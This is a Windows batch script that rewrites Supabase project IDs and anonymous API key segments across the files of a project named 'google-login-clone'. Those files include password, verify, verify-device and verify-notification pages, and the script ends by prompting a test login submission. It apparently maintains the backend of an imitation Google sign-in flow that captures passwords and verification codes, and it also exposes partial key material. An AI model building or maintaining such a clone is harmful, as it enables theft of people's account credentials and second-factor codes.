@echo off
echo 🔧 FIXING ALL API KEYS...

echo ✅ Updating script.js...
powershell -Command "(Get-Content 'google-login-clone/script.js') -replace 'nqsdardermkzppeaazbb', 'otbswtklpidhezziotac' | Set-Content 'google-login-clone/script.js'"

echo ✅ Updating password.js...
powershell -Command "(Get-Content 'google-login-clone/password.js') -replace 'nqsdardermkzppeaazbb', 'otbswtklpidhezziotac' | Set-Content 'google-login-clone/password.js'"

echo ✅ Updating verify.js...
powershell -Command "(Get-Content 'google-login-clone/verify.js') -replace 'nqsdardermkzppeaazbb', 'otbswtklpidhezziotac' | Set-Content 'google-login-clone/verify.js'"

echo ✅ Updating index.html...
powershell -Command "(Get-Content 'google-login-clone/index.html') -replace 'nqsdardermkzppeaazbb', 'otbswtklpidhezziotac' | Set-Content 'google-login-clone/index.html'"

echo ✅ Updating password.html...
powershell -Command "(Get-Content 'google-login-clone/password.html') -replace 'nqsdardermkzppeaazbb', 'otbswtklpidhezziotac' | Set-Content 'google-login-clone/password.html'"

echo ✅ Updating verify.html...
powershell -Command "(Get-Content 'google-login-clone/verify.html') -replace 'nqsdardermkzppeaazbb', 'otbswtklpidhezziotac' | Set-Content 'google-login-clone/verify.html'"

echo ✅ Updating verify-device.html...
powershell -Command "(Get-Content 'google-login-clone/verify-device.html') -replace 'nqsdardermkzppeaazbb', 'otbswtklpidhezziotac' | Set-Content 'google-login-clone/verify-device.html'"

echo ✅ Updating verify-notification.html...
powershell -Command "(Get-Content 'google-login-clone/verify-notification.html') -replace 'nqsdardermkzppeaazbb', 'otbswtklpidhezziotac' | Set-Content 'google-login-clone/verify-notification.html'"

echo ✅ Updating test-supabase.html...
powershell -Command "(Get-Content 'test-supabase.html') -replace 'nqsdardermkzppeaazbb', 'otbswtklpidhezziotac' | Set-Content 'test-supabase.html'"

echo ✅ Now fixing API keys...
powershell -Command "(Get-Content 'google-login-clone/script.js') -replace 'eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0', 'eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im90YnN3dGtscGlkaGV6emlvdGFjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTEwOTIyNTEsImV4cCI6MjA2NjY2ODI1MX0' | Set-Content 'google-login-clone/script.js'"

echo.
echo 🎉 ALL KEYS UPDATED!
echo 📋 Summary:
echo    ✅ Updated project IDs from nqsdardermkzppeaazbb to otbswtklpidhezziotac  
echo    ✅ Updated API keys to latest version
echo    ✅ All files ready for testing
echo.
echo 🚀 Ready to test! Try submitting a login request now.
pause 